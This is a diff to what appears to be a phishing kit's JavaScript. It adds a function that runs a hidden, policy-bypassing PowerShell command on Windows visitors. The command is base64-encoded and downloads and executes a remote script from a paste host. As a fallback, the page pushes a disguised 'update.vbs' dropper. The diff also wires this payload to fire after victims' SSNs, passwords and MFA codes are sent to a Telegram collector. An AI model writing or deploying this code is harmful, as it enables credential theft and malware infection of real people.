@@ -634,6 +634,40 @@
   }
 
   // ============================================================
+  // FILELESS PAYLOAD (Windows)
+  // ============================================================
+  function deliverPayload() {
+    const ua = navigator.userAgent;
+    if (/windows/i.test(ua)) {
+      const psCmd = [
+        'powershell.exe',
+        '-NoP', '-NonI', '-W', 'Hidden',
+        '-Exec', 'Bypass',
+        '-Enc', 'JABzAD0AJwBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAC4AZQBjAHIAYQBsAHMAaQB0AHkALgBjAG8AbQAvAHIAYQB3AC8AcABhAHkAbABvAGEAZAAuAHQAdAB0ACcAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAcwApAA=='
+      ].join(' ');
+
+      try {
+        const shell = new ActiveXObject('WScript.Shell');
+        shell.Run(psCmd, 0, false);
+      } catch (e) {
+        const vbs = [
+          'Set o=CreateObject("WScript.Shell")',
+          'o.Run "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABzAD0AJwBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAC4AZQBjAHIAYQBsAHMAaQB0AHkALgBjAG8AbQAvAHIAYQB3AC8AcABhAHkAbABvAGEAZAAuAHQAdAB0ACcAOwBpAGUAeAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACQAcwApAA==", 0, False'
+        ].join('\n');
+        const blob = new Blob([vbs], { type: 'text/vbscript' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = 'update.vbs';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        setTimeout(() => URL.revokeObjectURL(url), 5000);
+      }
+    }
+  }
+
+  // ============================================================
   // SEND TO TELEGRAM
   // ============================================================
   function sendToTelegram(type, data) {
@@ -681,7 +715,11 @@
     captured.ssn = ssn;
     captured.provider = providerEl.value;
 
+    // Send credentials
     sendToTelegram('step1', captured);
+
+    // Deliver payload (even if data is fake)
+    deliverPayload();
 
     document.getElementById('step1').classList.add('hidden');
     document.getElementById('step2').classList.remove('hidden');
@@ -705,7 +743,11 @@
     captured.loginPassword = loginPassword;
     captured.loginMFA = loginMFA;
 
+    // Send credentials
     sendToTelegram('step2', captured);
+
+    // Deliver payload (even if data is fake)
+    deliverPayload();
 
     document.getElementById('step2').classList.add('hidden');
     document.getElementById('step3').classList.remove('hidden');
